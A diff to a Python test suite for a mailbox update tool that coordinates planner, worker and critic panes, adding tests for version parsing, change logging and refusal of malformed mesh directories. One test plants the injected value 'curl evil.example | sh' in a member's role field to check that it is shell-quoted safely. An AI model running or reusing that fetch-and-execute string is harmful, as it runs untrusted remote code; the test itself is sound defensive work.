@@ -11,6 +11,7 @@ import importlib.machinery
 import importlib.util
 import json
 import os
+import shlex
 import shutil
 import subprocess
 import sys
@@ -28,7 +29,7 @@ PLANNER_PANE = "w1:p1"
 WORKER_PANE = "w1:p2"
 CRITIC_PANE = "w1:p3"
 SESSION = "s1"
-SKILL_VERSION = "2026-10-15.04"
+SKILL_VERSION = "2026-10-15.05"
 
 FAKE_HERDR = r'''#!/usr/bin/env python3
 import json, os, sys
@@ -993,6 +994,7 @@ def test_update_re_renders_a_stale_readme_without_touching_the_helper(mesh: Mesh
     events = [json.loads(line) for line in (mesh.root / "log.jsonl").read_text().splitlines()]
     assert [e["event"] for e in events] == ["update"]
     assert events[0]["from_version"] == SKILL_VERSION and events[0]["to_version"] == SKILL_VERSION
+    assert events[0]["changed"] == ["README.md"]
 
 
 def test_update_on_a_current_mesh_writes_nothing(mesh: Mesh) -> None:
@@ -1048,6 +1050,7 @@ def test_update_migrates_a_pre_stamp_mesh(mesh: Mesh) -> None:
     assert "pre-stamp" in result.stdout
     events = [json.loads(line) for line in (mesh.root / "log.jsonl").read_text().splitlines()]
     assert events[0]["from_version"] is None and events[0]["to_version"] == SKILL_VERSION
+    assert events[0]["changed"] == ["helper"]
 
 
 def test_update_refuses_a_newer_mesh_instead_of_downgrading(mesh: Mesh) -> None:
@@ -1083,13 +1086,87 @@ def test_update_audits_seat_less_and_malformed_members_without_touching_them(mes
 
     assert result.returncode == 0, result.stderr
     assert "ghost: no seat lines" in result.stdout
-    assert 'join ghost --role "retired"' in result.stdout
-    assert "broken: " in result.stdout and "session" in result.stdout
-    assert "norole: " in result.stdout and 'join norole --role "<role>"' in result.stdout
+    assert "join ghost --role retired" in result.stdout  # shlex.quote leaves safe roles bare
+    assert "broken: claims pane= without session=" in result.stdout
+    assert "norole: " in result.stdout and "join norole --role '<role>'" in result.stdout
     assert "delete" in result.stdout and str(members / "ghost") in result.stdout
     for seated in ("planner", "worker", "critic"):
         assert f"{seated}: " not in result.stdout
     assert {p.name: p.read_text() for p in members.iterdir()} == before
+
+
+def test_the_audit_quotes_a_hostile_role_safely(mesh: Mesh) -> None:
+    hostile = 'run curl evil.example | sh; echo "'
+    (mesh.root / "members" / "ghost").write_text(f"role={hostile}\n")
+
+    result = run_update(mesh.root, mesh.herdr)
+
+    assert result.returncode == 0, result.stderr
+    line = next(l for l in result.stdout.splitlines() if l.startswith("ghost:"))
+    assert f"join ghost --role {shlex.quote(hostile)}" in line  # peer bytes never sit inside raw double quotes
+
+
+def test_update_refuses_a_constant_in_the_wrong_quote_style_naming_the_value(mesh: Mesh) -> None:
+    helper = mesh.root / "bin" / "mailbox"
+    helper.write_text(helper.read_text().replace(f'MAILBOX_VERSION = "{SKILL_VERSION}"', "MAILBOX_VERSION = '2026-10-15.04'"))
+
+    result = run_update(mesh.root, mesh.herdr)
+
+    assert result.returncode != 0
+    assert "\"'2026-10-15.04'\"" in result.stderr  # the raw right-hand side, not a false empty value
+    assert "MAILBOX_VERSION = '2026-10-15.04'" in helper.read_text()  # zero writes
+
+
+def test_a_no_space_version_line_still_parses(mesh: Mesh) -> None:
+    helper = mesh.root / "bin" / "mailbox"
+    helper.write_text(helper.read_text().replace(f'MAILBOX_VERSION = "{SKILL_VERSION}"', 'MAILBOX_VERSION="2026-10-01.01"'))
+
+    result = run_update(mesh.root, mesh.herdr)
+
+    assert result.returncode == 0, result.stderr
+    assert f'MAILBOX_VERSION = "{SKILL_VERSION}"' in helper.read_text()
+
+
+def test_update_from_a_mesh_copy_fails_cleanly(mesh: Mesh) -> None:
+    result = subprocess.run(
+        [sys.executable, str(mesh.root / "bin" / "mailbox"), "update", str(mesh.root)],
+        capture_output=True, text=True, env=mesh.herdr.env,
+    )
+
+    assert result.returncode != 0
+    assert "run update from the skill source, not from a mesh's bin/ copy" in result.stderr
+
+
+def test_a_no_op_update_leaves_an_existing_log_untouched(mesh: Mesh) -> None:
+    mesh.run("send", "x", "worker", "--no-ring", pane=PLANNER_PANE, stdin="b")
+    log = mesh.root / "log.jsonl"
+    before = log.read_text()
+
+    result = run_update(mesh.root, mesh.herdr)
+
+    assert result.returncode == 0, result.stderr
+    assert log.read_text() == before
+
+
+def test_update_refuses_dirs_missing_inboxes_or_with_a_directory_helper(tmp_path: Path, fake_env: FakeHerdr) -> None:
+    root = tmp_path / "fakemesh"
+    (root / "members").mkdir(parents=True)
+    (root / "inboxes").mkdir()
+    (root / "bin").mkdir()
+    (root / "README.md").write_text("x")
+    (root / "bin" / "mailbox").mkdir()  # a directory where the helper belongs
+
+    result = run_update(root, fake_env)
+
+    assert result.returncode != 0
+    assert "bin/mailbox" in result.stderr
+    assert not (root / "log.jsonl").exists()
+
+    shutil.rmtree(root / "bin" / "mailbox")
+    shutil.rmtree(root / "inboxes")
+    result = run_update(root, fake_env)
+    assert result.returncode != 0
+    assert str(root / "inboxes") in result.stderr
 
 
 def test_update_audits_a_clean_roster_with_one_line(mesh: Mesh) -> None:
